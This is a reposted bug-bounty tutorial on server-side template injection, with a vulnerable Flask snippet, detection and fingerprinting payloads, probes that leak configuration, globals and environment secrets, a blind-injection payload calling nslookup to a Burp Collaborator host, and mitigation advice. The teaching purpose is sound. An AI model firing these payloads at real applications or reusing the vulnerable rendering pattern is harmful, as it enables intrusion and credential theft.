# :globe_with_meridians: All About Server Side Template Injection (SSTI)

> **Original Source:** [All About Server Side Template Injection (SSTI)](https://infosecwriteups.com/all-about-server-side-template-injection-ssti-101e45650c03)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# All About Server Side Template Injection (SSTI)


Hello Hackers, I Hope you guys are doing well and hunting lots of bugs and dollars !

## Introduction


Server Side Template Injection (SSTI), is a very impactful and most ignored bug, generally, we kind of miss it while performing security assessments. In this article, we are going to cover the basics of this vulnerability, its impact, and a brief methodology to hunt this.


The very first thing we should understand about template, template engines, and rendering functions, so let's understand them one by one.


Template engines allow dynamic content to be injected into static templates using placeholders and expressions. Some Common template engines are jinja2(python), Twig (PHP), Freemarker (Java), and Mustache (JavaScript), etc.

### why are we using it, what is the need?


So the idea is to display dynamic content with the static content. You must have observed that whenever any application take your user name as input and display you ads or any personalised stuff.


Have you ever wondered how it works, have they written your name in code, the answer is no, because they are using templates, that dynamically generate personalised output.


```
Had lunch, {{ name }}!
```


So it is like they are taking user input and passing it to the template and rendering the content. Taking untrusted user input is always risky when not handled properly.


The complete game is here about Dynamic Content Rendering, where user-provided data is inserted into a template like HTML, JSON, etc at runtime.


Here Template engines are middleware between user-provided data and what users view. The backend processing takes place at template engines only depending on the application logic. Different languages support different template engines like Handlebars (JavaScript), Twig (PHP), and Jinja2 (Python) etc.


## What is Server Side Template Injection?


When user input is directly passed into a template engine without proper sanitisation or validation, which allows malicious users to inject and execute arbitrary template code in the server-side templating engine.


```
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
user_input = request.args.get('name') # Takes user input from the URL.
template = f"Hello, {user_input}!" # Passing user input into template.
return render_template_string(template) # function used to dynamically rendering.

if __name__ == '__main__':
app.run(debug=True)
```


The above-mentioned is a vulnerable code snippet of flask + jinja2, which takes user input from the URL and directly passes it into the template without any sanitisation or validation.


This can be easily exploited, as the name parameter in the URL is user-controllable. An arbitrary user can inject a malicious SSTI payload that can be [http://xcheater.medium.com/?name={{](http://localhost:5000/?name=%7B%7B) 5 * 5}} and the result will be 25. This can be further escalated and may lead to remote code execution (RCE).


Additionally, In some cases, you might not immediately see the output of the injected payload, but there can be the possibility of blind or second order SSTI vulnerability.

### Impact of Server Side Template Injection


There are multiple scenarios where this vulnerability can be chained which can lead to Data Disclosure, Denial of services, Cross-site Scripting, Remote Code Execution, etc.

### How to identify SSTI?


- Identify all the entry points i.e. user-controlled inputs, Additionally try to focus more on where the application is taking user data and processing it to display any dynamic data. The goal is to look if there is any user-controllable part of the application that is directly passing into the server-side template.

- Initial Detection - Now, We can try putting common SSTI payloads mentioned below and check if is there any errors, mathematical operations, or any difference from regular data. Also, we can try using polyglots like ${{<%[%’”}}%\.


- Basic Detection - Inject expressions like {{7*7}}, ${7*7}, <%= 7*7 %>, ${{7*7}}, #{7*7}, {{‘7’*7}}, if the output is 49.

- Error-Based - Trigger errors (e.g., {{<%[%’”}}%}) to reveal engine type via messages.

- Blind SSTI: Use time delays (e.g., {{ sleep(5) }}, {{ system(‘nslookup your-burp-collaborator-url.burpcollaborator.net’) }}) or out-of-band (OOB) payloads (DNS/HTTP requests).


Use this Template Injection table to get some very specific Universal Error-based polyglot.


3. Identify the template engine used in the targeted application. You can use the Wappalyzer extension or look for application-generated errors through fuzzing. Additionally, analyzing JavaScript files can sometimes reveal the template engine or its configuration, which may be exposed.


Based on template engine you can craft payload or use similar payloads to chain this vulnerability to make it more impactful. Also, You can use a hit-and-trial method.


Here are some common template engines based on popular technologies:


- Flask (Python): Jinja2

- Django (Python): Django Template Language (DTL)

- Node.js (JavaScript): EJS, Handlebars, Pug (formerly Jade)

- Ruby on Rails (Ruby): ERB (Embedded Ruby)

- PHP: Twig, Blade

- ASP.NET: Razor

## Exploitation


Now that we’ve sufficient information and also we’ve identified SSTI, now we need to escalate it to prove an impact. Just mathematical calculation will not justify the impact.


## Get Xcheater’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Most of us, always try directly escalate it to RCE, which is not ideal way because your payload will make lots of noise. So instead of directly jumping to spraying payloads for RCE, we should approach it step by step. Additionally when spraying basic payloads to achieve any impact can work on some sites, but in most of the scenario, your exploitation payload may not work, so its better to be little creative use below bypasses or similar.


In most scenarios where you will able to achieve code execution. If code executions is not possible, still there can be other attacks which can be chained like information disclosure or denial of service.


Lets see whats the ideal way !!


Step 1: Identifying the engine with below techniques.


Syntax Fingerprinting


```
{{7*'7'}} → Jinja2 returns '7777777' (string), Twig returns 49 (number).
${"a"+"b"} → Mako/Freemarker returns "ab".
<%= 7*7 %> → ERB (Ruby) returns 49.
```


Leak Built-in Objects


```
{{config}} → Flask config (Python).
{{_self}} → Twig’s template scope (PHP).
<%= ENV.inspect %> → Ruby environment variables.
```


Step 2: Once we identified, we can explore what’s accessible in the engine like built-in objects, variables, configs, request objects and environment variabes, etc. Lets look into some famous template engines.


Jinja2 (Python/Flask):


```
{{ config }} → Leak Flask/Django configuration (secrets, debug mode).
{{ request }} → Access Flask request object (cookies, headers).
{{ self }} → Template namespace (may expose internal variables).
{{ url_for.__globals__ }} → Access global variables (e.g., `os`, `sys`).
```


Twig (PHP):


```
{{ _self }} → Template scope (exposes environment and filters).
{{ _self.env }} → Environment variables (e.g., database credentials).
{{ _self.loadTemplate() }} → Load arbitrary templates (file read?).
```


Freemarker (Java):


```
${.data_model} → Dump the data model (variables passed to the template).
${object?api.class} → Access Java object methods (reflection).
```


Sometimes you’ll find SSTI but won’t be able to get RCE, and that’s totally normal. It can happen for a bunch of reasons :-


- Some template engines are configured securely by default, they block access to dangerous objects like os, sys, or don’t allow accessing __globals__ and similar internals.

- Application might be running in a containerized or restricted environment (like Docker or sandbox), so even if code executes, it can’t really do anything harmful.

- The engine used might be logic-less (like Mustache or Handlebars), which means it just renders variables and doesn’t support any kind of code execution at all.

- In serverless setups or microservices with minimal permissions, your payload might execute, but due to lack of OS-level access, you still won’t get RCE.


But just because RCE isn’t possible doesn’t mean the bug is useless. We can still use SSTI to read sensitive files, perform internal SSRF attacks, or even mess with the application’s business logic. So its better to put some impact by chaining the vulnerability.

## Mitigation Strategy -Secure Template Engine Usage


- Use logic-less template engines like Mustache or Handlebars to avoid code execution altogether.

- Restrict access to built-ins like os, sys, subprocess, etc. that could be abused.

- Block dangerous functions like eval, __globals__, or anything that exposes internal execution context.

- Avoid using functions like render_template_string() or anything that dynamically compiles templates from user input. If you must use dynamic rendering, apply strict validation and proper escaping.


Input Validation and Sanitization


- Always validate and sanitize user inputs before using them in templates.

- Escape template-related characters like {, }, $, <%, and similar symbols.

- Avoid directly injecting raw user input into templates or using it in rendering functions.


Least Privilege and Runtime Hardening


- Run your app and template engine with the least privileges possible, never as root.

- Use containers or sandboxes to isolate the template rendering process from the core system.

- Don’t give the template engine access to OS-level resources or sensitive environment variables.


I hope this is informative to you, and if you have any doubts or suggestions, reach out to me over Twitter; I’ll be happy to assist or learn from you.


Happy Hacking !


Twitter handle :- [https://twitter.com/Xch_eater](https://twitter.com/Xch_eater)

---

*Originally published on [Medium](https://infosecwriteups.com/all-about-server-side-template-injection-ssti-101e45650c03). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
